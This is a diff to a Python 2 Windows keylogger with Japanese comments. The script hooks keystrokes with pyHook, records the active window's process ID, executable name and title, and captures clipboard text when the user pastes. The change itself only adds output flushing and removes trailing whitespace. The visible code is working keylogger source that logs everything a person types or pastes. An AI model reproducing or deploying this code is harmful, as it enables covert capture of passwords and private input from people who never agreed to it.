@@ -1,8 +1,9 @@
 ﻿# -*- coding: utf-8 -*-
 from ctypes import *
 import pythoncom
-import pyHook 
+import pyHook
 import win32clipboard
+import sys
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -35,19 +36,20 @@ def get_current_process():
     print
     print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
     print
-  
+    sys.stdout.flush()
+
 
     # ハンドルのクローズ
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
-    
+
 def KeyStroke(event):
 
-    global current_window   
+    global current_window
 
     # 操作中のウィンドウが変わったか確認
     if event.WindowName != current_window:
-        current_window = event.WindowName        
+        current_window = event.WindowName
         get_current_process()
 
     # 標準的なキーが押下されたかチェック
@@ -62,6 +64,7 @@ def KeyStroke(event):
             print "[PASTE] - %s" % (pasted_value),
         else:
             print "[%s]" % event.Key,
+            sys.stdout.flush()
 
     # 登録済みの次のフックに処理を渡す
     return True
